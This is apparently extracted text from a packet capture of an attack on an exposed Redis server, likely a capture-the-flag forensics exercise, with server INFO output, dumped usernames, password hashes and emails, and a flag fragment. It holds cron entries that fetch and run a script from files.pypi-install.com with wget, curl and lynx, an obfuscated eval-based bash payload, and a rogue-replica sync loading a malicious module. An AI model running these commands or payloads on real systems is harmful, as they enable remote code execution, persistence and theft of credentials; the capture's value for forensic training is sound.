+uptime_in_seconds:116
+uptime_in_days:0
+configured_hz:10
+lru_clock:4784662
+executable:/data/redis-server
+config_file:
+io_threads_active:0
+listener0:name=tcp,bind=*,bind=-::*,port=6379
+connected_clients:1
+cluster_connections:0
+maxclients:10000
+client_recent_max_input_buffer:0
+client_recent_max_output_buffer:0
+blocked_clients:0
+tracking_clients:0
+clients_in_timeout_table:0
+total_blocking_keys:0
+total_blocking_keys_on_nokey:0
+used_memory:982128
+used_memory_human:959.11K
+used_memory_rss:7921664
+used_memory_rss_human:7.55M
+used_memory_peak:1184824
+used_memory_peak_human:1.13M
+used_memory_peak_perc:82.89%
+used_memory_overhead:866480
+used_memory_startup:866224
+used_memory_dataset:115648
+used_memory_dataset_perc:99.78%
+allocator_allocated:1276416
+allocator_active:1392640
+allocator_resident:4059136
+total_system_memory:4102115328
+total_system_memory_human:3.82G
+used_memory_lua:31744
+used_memory_vm_eval:31744
+used_memory_lua_human:31.00K
+used_memory_scripts_eval:0
+number_of_cached_scripts:0
+number_of_functions:0
+number_of_libraries:0
+used_memory_vm_functions:32768
+used_memory_vm_total:64512
+used_memory_vm_total_human:63.00K
+used_memory_functions:184
+used_memory_scripts:184
+used_memory_scripts_human:184B
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+allocator_frag_ratio:1.09
+allocator_frag_bytes:116224
+allocator_rss_ratio:2.91
+allocator_rss_bytes:2666496
+rss_overhead_ratio:1.95
+rss_overhead_bytes:3862528
+mem_fragmentation_ratio:8.64
+mem_fragmentation_bytes:7004792
+mem_not_counted_for_evict:0
+mem_replication_backlog:0
+mem_total_replication_buffers:0
+mem_clients_slaves:0
+mem_clients_normal:0
+mem_cluster_links:0
+mem_aof_buffer:0
+mem_allocator:jemalloc-5.3.0
+active_defrag_running:0
+lazyfree_pending_objects:0
+lazyfreed_objects:0
+# Persistence
+async_loading:0
+current_cow_peak:0
+current_cow_size:0
+current_cow_size_age:0
+current_fork_perc:0.00
+current_save_keys_processed:0
+current_save_keys_total:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1699283450
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:0
+rdb_current_bgsave_time_sec:-1
+rdb_saves:1
+rdb_last_cow_size:593920
+rdb_last_load_keys_expired:0
+rdb_last_load_keys_loaded:0
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_rewrites:0
+aof_rewrites_consecutive_failures:0
+aof_last_write_status:ok
+aof_last_cow_size:0
+module_fork_in_progress:0
+module_fork_last_cow_size:0
+total_connections_received:2
+total_commands_processed:13
+instantaneous_ops_per_sec:0
+total_net_input_bytes:1537
+total_net_output_bytes:204471
+total_net_repl_input_bytes:0
+total_net_repl_output_bytes:0
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+instantaneous_input_repl_kbps:0.00
+instantaneous_output_repl_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+expire_cycle_cpu_milliseconds:2
+evicted_keys:0
+evicted_clients:0
+total_eviction_exceeded_time:0
+current_eviction_exceeded_time:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+pubsubshard_channels:0
+latest_fork_usec:181
+total_forks:1
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+total_active_defrag_time:0
+current_active_defrag_time:0
+tracking_total_keys:0
+tracking_total_items:0
+tracking_total_prefixes:0
+unexpected_error_replies:0
+total_error_replies:0
+dump_payload_sanitizations:0
+total_reads_processed:15
+total_writes_processed:15
+io_threaded_reads_processed:0
+io_threaded_writes_processed:0
+reply_buffer_shrinks:0
+reply_buffer_expands:0
+eventloop_cycles:1058
+eventloop_duration_sum:185108
+eventloop_duration_cmd_sum:8284
+instantaneous_eventloop_cycles_per_sec:8
+instantaneous_eventloop_duration_usec:151
+acl_access_denied_auth:0
+acl_access_denied_cmd:0
+acl_access_denied_key:0
+acl_access_denied_channel:0
+# Replication
+role:master
+connected_slaves:0
+master_failover_state:no-failover
+master_replid:86d03325daa4b4813f5f1ef94c0bc4839cf664b5
+master_replid2:0000000000000000000000000000000000000000
+master_repl_offset:0
+second_repl_offset:-1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+used_cpu_sys:0.135467
+used_cpu_user:0.118533
+used_cpu_sys_children:0.000000
+used_cpu_user_children:0.001777
+used_cpu_sys_main_thread:0.135267
+used_cpu_user_main_thread:0.118359
+# Errorstats
+cluster_enabled:0
+# Keyspace
+db0:keys=1,expires=0,avg_ttl=0
+users_table
+users_table
+users_table
+alice7185:password
+6ccd3011eba1f7f0cb6e6143c40580e1
+alice7185:email
+alice7185@htb.local
+bob9862:password
+8baea79cb48a8ed8247cce03f6b1ab14
+bob9862:email
+bob9862@htb.local
+charlie4371:password
+a2a789021839be8f458b49ffd107558a
+charlie4371:email
+charlie4371@htb.local
+david5014:password
+f059fc5d167f597a91c48041dea1460a
+david5014:email
+david5014@htb.local
+emma1716:password
+d7df8cffd58ec406c74116a33afd3cc7
+emma1716:email
+emma1716@htb.local
+frank2180:password
+4fe3d40556cd5fe47872053f2f2818b1
+frank2180:email
+frank2180@htb.local
+grace8972:password
+f2d9e78f6c3717c9bfb3507e95074189
+grace8972:email
+grace8972@htb.local
+henry6159:password
+afb04edbeda01e437c644e84c1d539eb
+henry6159:email
+FLAG_PART:_c0uld_0p3n_n3w
+ivy7948:password
+70fde9bb12772a894ac7b51fe78f1da2
+ivy7948:email
+ivy7948@htb.local
+jack3908:password
+9f791d0427c8a5e299fceffb20205492
+jack3908:email
+jack3908@htb.local
+/var/spool/cron
+DBFILENAME
+* * * * * wget -O VgLy8V0Zxo 'http://files.pypi-install.com/packages/VgLy8V0Zxo' && bash VgLy8V0Zxo
+*/5 * * * * curl -s -k 'http://files.pypi-install.com/packages/VgLy8V0Zxo' > VgLy8V0Zxo && bash VgLy8V0Zxo
+*/7 * * * * lynx -source 'http://files.pypi-install.com/packages/VgLy8V0Zxo' > VgLy8V0Zxo && bash VgLy8V0Zxo
+/var/spool/cron/crontabs
+GET /packages/VgLy8V0Zxo HTTP/1.1
+Host: files.pypi-install.com
+User-Agent: Wget
+Connection: close
+>HTTP/1.1 200 OK
+Date: Mon, 06 Nov 2023 15:11:30 GMT
+Server: Apache/2.4.54 (Debian)
+Last-Modified: Mon, 06 Nov 2023 15:08:53 GMT
+ETag: "959-6097d3b79b941"
+Accept-Ranges: bytes
+Content-Length: 2393
+Connection: close
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
+1943567864
+10.10.0.15
+dbfilename
+x10SPFHN.so
+listening-port
+86d03325daa4b4813f5f1ef94c0bc4839cf664b5
++FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1
+sqRqnAL=XO
+RedisModule_Alloc
+RedisModule_TryAlloc
+RedisModule_Realloc
+RedisModule_Free
+RedisModule_Calloc
+RedisModule_Strdup
+RedisModule_GetApi
+RedisModule_CreateCommand
+RedisModule_GetCommand
+RedisModule_CreateSubcommand
+RedisModule_SetCommandInfo
+RedisModule_SetCommandACLCategories
+RedisModule_AddACLCategory
+RedisModule_SetModuleAttribs
+RedisModule_IsModuleNameBusy
+RedisModule_WrongArity
+RedisModule_ReplyWithLongLong
+RedisModule_GetSelectedDb
+RedisModule_SelectDb
+RedisModule_KeyExists
+RedisModule_OpenKey
+RedisModule_GetOpenKeyModesAll
+RedisModule_CloseKey
+RedisModule_KeyType
+RedisModule_ValueLength
+RedisModule_ListPush
+RedisModule_ListPop
+RedisModule_ListGet
+RedisModule_ListSet
+RedisModule_ListInsert
+RedisModule_ListDelete
+RedisModule_Call
+RedisModule_CallReplyProto
+RedisModule_FreeCallReply
+RedisModule_CallReplyType
+RedisModule_CallReplyInteger
+RedisModule_CallReplyDouble
+RedisModule_CallReplyBool
+RedisModule_CallReplyBigNumber
+RedisModule_CallReplyVerbatim
+RedisModule_CallReplySetElement
+RedisModule_CallReplyMapElement
+RedisModule_CallReplyAttributeElement
+RedisModule_CallReplyPromiseSetUnblockHandler
+RedisModule_CallReplyPromiseAbort
+RedisModule_CallReplyAttribute
+RedisModule_CallReplyLength
+RedisModule_CallReplyArrayElement
+RedisModule_CreateString
+RedisModule_CreateStringFromLongLong
+RedisModule_CreateStringFromULongLong
+RedisModule_CreateStringFromDouble
+RedisModule_CreateStringFromLongDouble
+RedisModule_CreateStringFromString
+RedisModule_CreateStringFromStreamID
+RedisModule_CreateStringPrintf
+RedisModule_FreeString
+RedisModule_StringPtrLen
+RedisModule_ReplyWithError
+RedisModule_ReplyWithErrorFormat
+RedisModule_ReplyWithSimpleString
+RedisModule_ReplyWithArray
+RedisModule_ReplyWithMap
+RedisModule_ReplyWithSet
+RedisModule_ReplyWithAttribute
+RedisModule_ReplyWithNullArray
+RedisModule_ReplyWithEmptyArray
+RedisModule_ReplySetArrayLength
+RedisModule_ReplySetMapLength
+RedisModule_ReplySetSetLength
+RedisModule_ReplySetAttributeLength
+RedisModule_ReplySetPushLength
+RedisModule_ReplyWithStringBuffer
+RedisModule_ReplyWithCString
+RedisModule_ReplyWithString
+RedisModule_ReplyWithEmptyString
+RedisModule_ReplyWithVerbatimString
+RedisModule_ReplyWithVerbatimStringType
+RedisModule_ReplyWithNull
+RedisModule_ReplyWithBool
+RedisModule_ReplyWithLongDouble
+RedisModule_ReplyWithDouble
+RedisModule_ReplyWithBigNumber
+RedisModule_ReplyWithCallReply
+RedisModule_StringToLongLong
+RedisModule_StringToULongLong
+RedisModule_StringToDouble
+RedisModule_StringToLongDouble
+RedisModule_StringToStreamID
+RedisModule_AutoMemory
+RedisModule_Replicate
+RedisModule_ReplicateVerbatim
+RedisModule_CallReplyStringPtr
+RedisModule_CreateStringFromCallReply
+RedisModule_DeleteKey
+RedisModule_UnlinkKey
+RedisModule_StringSet
+RedisModule_StringDMA
+RedisModule_StringTruncate
+RedisModule_GetExpire
+RedisModule_SetExpire
+RedisModule_GetAbsExpire
+RedisModule_SetAbsExpire
+RedisModule_ResetDataset
+RedisModule_DbSize
+RedisModule_RandomKey
+RedisModule_ZsetAdd
+RedisModule_ZsetIncrby
+RedisModule_ZsetScore
+RedisModule_ZsetRem
+RedisModule_ZsetRangeStop
+RedisModule_ZsetFirstInScoreRange
+RedisModule_ZsetLastInScoreRange
+RedisModule_ZsetFirstInLexRange
+RedisModule_ZsetLastInLexRange
+RedisModule_ZsetRangeCurrentElement
+RedisModule_ZsetRangeNext
+RedisModule_ZsetRangePrev
+RedisModule_ZsetRangeEndReached
+RedisModule_HashSet
+RedisModule_HashGet
+RedisModule_StreamAdd
+RedisModule_StreamDelete
+RedisModule_StreamIteratorStart
+RedisModule_StreamIteratorStop
+RedisModule_StreamIteratorNextID
+RedisModule_StreamIteratorNextField
+RedisModule_StreamIteratorDelete
+RedisModule_StreamTrimByLength
+RedisModule_StreamTrimByID
+RedisModule_IsKeysPositionRequest
+RedisModule_KeyAtPos
+RedisModule_KeyAtPosWithFlags
+RedisModule_IsChannelsPositionRequest
+RedisModule_ChannelAtPosWithFlags
+RedisModule_GetClientId
+RedisModule_GetClientUserNameById
+RedisModule_GetClientInfoById
+RedisModule_GetClientNameById
+RedisModule_SetClientNameById
+RedisModule_PublishMessage
+RedisModule_PublishMessageShard
+RedisModule_GetContextFlags
+RedisModule_AvoidReplicaTraffic
+RedisModule_PoolAlloc
+RedisModule_CreateDataType
+RedisModule_ModuleTypeSetValue
+RedisModule_ModuleTypeReplaceValue
+RedisModule_ModuleTypeGetType
+RedisModule_ModuleTypeGetValue
+RedisModule_IsIOError
+RedisModule_SetModuleOptions
+RedisModule_SignalModifiedKey
+RedisModule_SaveUnsigned
+RedisModule_LoadUnsigned
+RedisModule_SaveSigned
+RedisModule_LoadSigned
+RedisModule_EmitAOF
+RedisModule_SaveString
+RedisModule_SaveStringBuffer
+RedisModule_LoadString
+RedisModule_LoadStringBuffer
+RedisModule_SaveDouble
+RedisModule_LoadDouble
+RedisModule_SaveFloat
+RedisModule_LoadFloat
+RedisModule_SaveLongDouble
+RedisModule_LoadLongDouble
+RedisModule_LoadDataTypeFromString
+RedisModule_LoadDataTypeFromStringEncver
+RedisModule_SaveDataTypeToString
+RedisModule_Log
+RedisModule_LogIOError
+RedisModule__Assert
+RedisModule_LatencyAddSample
+RedisModule_StringAppendBuffer
+RedisModule_TrimStringAllocation
+RedisModule_RetainString
+RedisModule_HoldString
+RedisModule_StringCompare
+RedisModule_GetContextFromIO
+RedisModule_GetKeyNameFromIO
+RedisModule_GetKeyNameFromModuleKey
+RedisModule_GetDbIdFromModuleKey
+RedisModule_GetDbIdFromIO
+RedisModule_GetDbIdFromOptCtx
+RedisModule_GetToDbIdFromOptCtx
+RedisModule_GetKeyNameFromOptCtx
+RedisModule_GetToKeyNameFromOptCtx
+RedisModule_Milliseconds
+RedisModule_MonotonicMicroseconds
+RedisModule_Microseconds
+RedisModule_CachedMicroseconds
+RedisModule_DigestAddStringBuffer
+RedisModule_DigestAddLongLong
+RedisModule_DigestEndSequence
+RedisModule_GetDbIdFromDigest
+RedisModule_GetKeyNameFromDigest
+RedisModule_CreateDict
+RedisModule_FreeDict
+RedisModule_DictSize
+RedisModule_DictSetC
+RedisModule_DictReplaceC
+RedisModule_DictSet
+RedisModule_DictReplace
+RedisModule_DictGetC
+RedisModule_DictGet
+RedisModule_DictDelC
+RedisModule_DictDel
+RedisModule_DictIteratorStartC
+RedisModule_DictIteratorStart
+RedisModule_DictIteratorStop
+RedisModule_DictIteratorReseekC
+RedisModule_DictIteratorReseek
+RedisModule_DictNextC
+RedisModule_DictPrevC
+RedisModule_DictNext
+RedisModule_DictPrev
+RedisModule_DictCompareC
+RedisModule_DictCompare
+RedisModule_RegisterInfoFunc
+RedisModule_RegisterAuthCallback
+RedisModule_InfoAddSection
+RedisModule_InfoBeginDictField
+RedisModule_InfoEndDictField
+RedisModule_InfoAddFieldString
+RedisModule_InfoAddFieldCString
+RedisModule_InfoAddFieldDouble
+RedisModule_InfoAddFieldLongLong
+RedisModule_InfoAddFieldULongLong
+RedisModule_GetServerInfo
+RedisModule_FreeServerInfo
+RedisModule_ServerInfoGetField
+RedisModule_ServerInfoGetFieldC
+RedisModule_ServerInfoGetFieldSigned
+RedisModule_ServerInfoGetFieldUnsigned
+RedisModule_ServerInfoGetFieldDouble
+RedisModule_SubscribeToServerEvent
+RedisModule_SetLRU
+RedisModule_GetLRU
+RedisModule_SetLFU
+RedisModule_GetLFU
+RedisModule_BlockClientOnKeys
+RedisModule_BlockClientOnKeysWithFlags
+RedisModule_SignalKeyAsReady
+RedisModule_GetBlockedClientReadyKey
+RedisModule_ScanCursorCreate
+RedisModule_ScanCursorRestart
+RedisModule_ScanCursorDestroy
+RedisModule_Scan
+RedisModule_ScanKey
+RedisModule_GetContextFlagsAll
+RedisModule_GetModuleOptionsAll
+RedisModule_GetKeyspaceNotificationFlagsAll
+RedisModule_IsSubEventSupported
+RedisModule_GetServerVersion
+RedisModule_GetTypeMethodVersion
+RedisModule_Yield
+RedisModule_BlockClient
+RedisModule_BlockClientGetPrivateData
+RedisModule_BlockClientSetPrivateData
+RedisModule_BlockClientOnAuth
+RedisModule_UnblockClient
+RedisModule_IsBlockedReplyRequest
+RedisModule_IsBlockedTimeoutRequest
+RedisModule_GetBlockedClientPrivateData
+RedisModule_GetBlockedClientHandle
+RedisModule_AbortBlock
+RedisModule_BlockedClientMeasureTimeStart
+RedisModule_BlockedClientMeasureTimeEnd
+RedisModule_GetThreadSafeContext
+RedisModule_GetDetachedThreadSafeContext
+RedisModule_FreeThreadSafeContext
+RedisModule_ThreadSafeContextLock
+RedisModule_ThreadSafeContextTryLock
+RedisModule_ThreadSafeContextUnlock
+RedisModule_SubscribeToKeyspaceEvents
+RedisModule_AddPostNotificationJob
+RedisModule_NotifyKeyspaceEvent
+RedisModule_GetNotifyKeyspaceEvents
+RedisModule_BlockedClientDisconnected
+RedisModule_RegisterClusterMessageReceiver
+RedisModule_SendClusterMessage
+RedisModule_GetClusterNodeInfo
+RedisModule_GetClusterNodesList
+RedisModule_FreeClusterNodesList
+RedisModule_CreateTimer
+RedisModule_StopTimer
+RedisModule_GetTimerInfo
+RedisModule_GetMyClusterID
+RedisModule_GetClusterSize
+RedisModule_GetRandomBytes
+RedisModule_GetRandomHexChars
+RedisModule_SetDisconnectCallback
+RedisModule_SetClusterFlags
+RedisModule_ExportSharedAPI
+RedisModule_GetSharedAPI
+RedisModule_RegisterCommandFilter
+RedisModule_UnregisterCommandFilter
+RedisModule_CommandFilterArgsCount
+RedisModule_CommandFilterArgGet
+RedisModule_CommandFilterArgInsert
+RedisModule_CommandFilterArgReplace
+RedisModule_CommandFilterArgDelete
+RedisModule_CommandFilterGetClientId
+RedisModule_Fork
+RedisModule_SendChildHeartbeat
+RedisModule_ExitFromChild
+RedisModule_KillForkChild
+RedisModule_GetUsedMemoryRatio
+RedisModule_MallocSize
+RedisModule_MallocUsableSize
+RedisModule_MallocSizeString
+RedisModule_MallocSizeDict
+RedisModule_CreateModuleUser
+RedisModule_FreeModuleUser
+RedisModule_SetContextUser
+RedisModule_SetModuleUserACL
+RedisModule_SetModuleUserACLString
+RedisModule_GetModuleUserACLString
+RedisModule_GetCurrentUserName
+RedisModule_GetModuleUserFromUserName
+RedisModule_ACLCheckCommandPermissions
+RedisModule_ACLCheckKeyPermissions
+RedisModule_ACLCheckChannelPermissions
+RedisModule_ACLAddLogEntry
+RedisModule_ACLAddLogEntryByUserName
+RedisModule_AuthenticateClientWithACLUser
+RedisModule_AuthenticateClientWithUser
+RedisModule_DeauthenticateAndCloseClient
+RedisModule_RedactClientCommandArgument
+RedisModule_GetClientCertificate
+RedisModule_GetCommandKeys
+RedisModule_GetCommandKeysWithFlags
+RedisModule_GetCurrentCommandName
+RedisModule_RegisterDefragFunc
+RedisModule_DefragAlloc
+RedisModule_DefragRedisModuleString
+RedisModule_DefragShouldStop
+RedisModule_DefragCursorSet
+RedisModule_DefragCursorGet
+RedisModule_GetDbIdFromDefragCtx
+RedisModule_GetKeyNameFromDefragCtx
+RedisModule_EventLoopAdd
+RedisModule_EventLoopDel
+RedisModule_EventLoopAddOneShot
+RedisModule_RegisterBoolConfig
+RedisModule_RegisterNumericConfig
+RedisModule_RegisterStringConfig
+RedisModule_RegisterEnumConfig
+RedisModule_LoadConfigs
+RedisModule_RdbStreamCreateFromFile
+RedisModule_RdbStreamFree
+RedisModule_RdbLoad
+RedisModule_RdbSave
+hexStringToBytes
+__isoc99_sscanf
+EVP_CIPHER_CTX_new
+EVP_aes_256_cbc
+EVP_EncryptInit_ex
+EVP_EncryptUpdate
+EVP_EncryptFinal_ex
+EVP_CIPHER_CTX_free
+__stack_chk_fail
+RedisModule_OnLoad
+GLIBC_2.2.5
+RedisModule_Alloc
+RedisModule_TryAlloc
+RedisModule_Calloc
+RedisModule_Free
+RedisModule_Realloc
+RedisModule_Strdup
+RedisModule_CreateCommand
+RedisModule_GetCommand
+RedisModule_CreateSubcommand
+RedisModule_SetCommandInfo
+RedisModule_SetCommandACLCategories
+RedisModule_AddACLCategory
+RedisModule_SetModuleAttribs
+RedisModule_IsModuleNameBusy
+RedisModule_WrongArity
+RedisModule_ReplyWithLongLong
+RedisModule_ReplyWithError
+RedisModule_ReplyWithErrorFormat
+RedisModule_ReplyWithSimpleString
+RedisModule_ReplyWithArray
+RedisModule_ReplyWithMap
+RedisModule_ReplyWithSet
+RedisModule_ReplyWithAttribute
+RedisModule_ReplyWithNullArray
+RedisModule_ReplyWithEmptyArray
+RedisModule_ReplySetArrayLength
+RedisModule_ReplySetMapLength
+RedisModule_ReplySetSetLength
+RedisModule_ReplySetAttributeLength
+RedisModule_ReplySetPushLength
+RedisModule_ReplyWithStringBuffer
+RedisModule_Re1
+plyWithCString
+RedisModule_ReplyWithString
+RedisModule_ReplyWithEmptyString
+RedisModule_ReplyWithVerbatimString
+RedisModule_ReplyWithVerbatimStringType
+RedisModule_ReplyWithNull
+RedisModule_ReplyWithBool
+RedisModule_ReplyWithCallReply
+RedisModule_ReplyWithDouble
+RedisModule_ReplyWithBigNumber
+RedisModule_ReplyWithLongDouble
+RedisModule_GetSelectedDb
+RedisModule_SelectDb
+RedisModule_KeyExists
+RedisModule_OpenKey
+RedisModule_GetOpenKeyModesAll
+RedisModule_CloseKey
+RedisModule_KeyType
+RedisModule_ValueLength
+RedisModule_ListPush
+RedisModule_ListPop
+RedisModule_ListGet
+RedisModule_ListSet
+RedisModule_ListInsert
+RedisModule_ListDelete
+RedisModule_StringToLongLong
+RedisModule_StringToULongLong
+RedisModule_StringToDouble
+RedisModule_StringToLongDouble
+RedisModule_StringToStreamID
+RedisModule_Call
+RedisModule_CallReplyProto
+RedisModule_FreeCallReply
+RedisModule_CallReplyInteger
+RedisModule_CallReplyDouble
+RedisModule_CallReplyBool
+RedisModule_CallReplyBigNumber
+RedisModule_CallReplyVerbatim
+RedisModule_CallReplySetElement
+RedisModule_CallReplyMapElement
+RedisModule_CallReplyAttributeElement
+RedisModule_CallReplyPromiseSetUnblockHandler
+RedisModule_CallReplyPromiseAbort
+RedisModule_CallReplyAttribute
+RedisModule_CallReplyType
+RedisModule_CallReplyLength
+RedisModule_CallReplyArrayElement
+RedisModule_CallReplyStringPtr
+RedisModule_CreateStringFromCallReply
+RedisModule_CreateString
+RedisModule_CreateStringFromLongLong
+RedisModule_CreateStringFromULongLong
+RedisModule_CreateStringFromDouble
+RedisModule_CreateStringFromLongDouble
+RedisModule_CreateStringFromString
+RedisModule_CreateStringFromStreamID
+RedisModule_CreateStringPrintf
+RedisModule_FreeString
+RedisModule_StringPtrLen
+RedisModule_AutoMemory
+RedisModule_Replicate
+RedisModule_ReplicateVerbatim
+RedisModule_DeleteKey
+RedisModule_UnlinkKey
+RedisModule_StringSet
+RedisModule_StringDMA
+RedisModule_StringTruncate
+RedisModule_GetExpire
+RedisModule_SetExpire
+RedisModule_GetAbsExpire
+RedisModule_SetAbsExpire
+RedisModule_ResetDataset
+RedisModule_DbSize
+RedisModule_RandomKey
+RedisModule_ZsetAdd
+RedisModule_ZsetIncrby
+RedisModule_ZsetScore
+RedisModule_ZsetRem
+RedisModule_ZsetRangeStop
+RedisModule_ZsetFirstInScoreRange
+RedisModule_ZsetLastInScoreRange
+RedisModule_ZsetFirstInLexRange
+RedisModule_ZsetLastInLexRange
+RedisModule_ZsetRangeCurrentElement
+RedisModule_ZsetRangeNext
+RedisModule_ZsetRangePrev
+RedisModule_ZsetRangeEndReached
+RedisModule_HashSet
+RedisModule_HashGet
+RedisModule_StreamAdd
+RedisModule_StreamDelete
+RedisModule_StreamIteratorStart
+RedisModule_StreamIteratorStop
+RedisModule_StreamIteratorNextID
+RedisModule_StreamIteratorNextField
+RedisModule_StreamIteratorDelete
+RedisModule_StreamTrimByLength
+RedisModule_StreamTrimByID
+RedisModule_IsKeysPositionRequest
+RedisModule_KeyAtPos
+RedisModule_KeyAtPosWithFlags
+RedisModule_IsChannelsPositionRequest
+RedisModule_ChannelAtPosWithFlags
+RedisModule_GetClientId
+RedisModule_GetClientUserNameById
+RedisModule_GetContextFlags
+RedisModule_AvoidReplicaTraffic
+RedisModule_PoolAlloc
+RedisModule_CreateDataType
+RedisModule_ModuleTypeSetValue
+RedisModule_ModuleTypeReplaceValue
+RedisModule_ModuleTypeGetType
+RedisModule_ModuleTypeGetValue
+RedisModule_IsIOError
+RedisModule_SetModuleOptions
+RedisModule_SignalModifiedKey
+RedisModule_SaveUnsigned
+RedisModule_LoadUnsigned
+RedisModule_SaveSigned
+RedisModule_LoadSigned
+RedisModule_SaveString
+RedisModule_SaveStringBuffer
+RedisModule_LoadString
+RedisModule_LoadStringBuffer
+RedisModule_SaveDouble
+RedisModule_LoadDouble
+RedisModule_SaveFloat
+RedisModule_LoadFloat
+RedisModule_SaveLongDouble
+RedisModule_LoadLongDouble
+RedisModule_SaveDataTypeToString
+RedisModule_LoadDataTypeFromString
+RedisModule_LoadDataTypeFromStringEncver
+RedisModule_EmitAOF
+RedisModule_Log
+RedisModule_LogIOError
+RedisModule__Assert
+RedisModule_LatencyAddSample
+RedisModule_StringAppendBuffer
+RedisModule_TrimStringAllocation
+RedisModule_RetainString
+RedisModule_HoldString
+RedisModule_StringCompare
+RedisModule_GetContextFromIO
+RedisModule_GetKeyNameFromIO
+RedisModule_GetKeyNameFromModuleKey
+RedisModule_GetDbIdFromModuleKey
+RedisModule_GetDbIdFromIO
+RedisModule_GetKeyNameFromOptCtx
+RedisModule_GetToKeyNameFromOptCtx
+RedisModule_GetDbIdFromOptCtx
+RedisModule_GetToDbIdFromOptCtx
+RedisModule_Milliseconds
+RedisModule_MonotonicMicroseconds
+RedisModule_Microseconds
+RedisModule_CachedMicroseconds
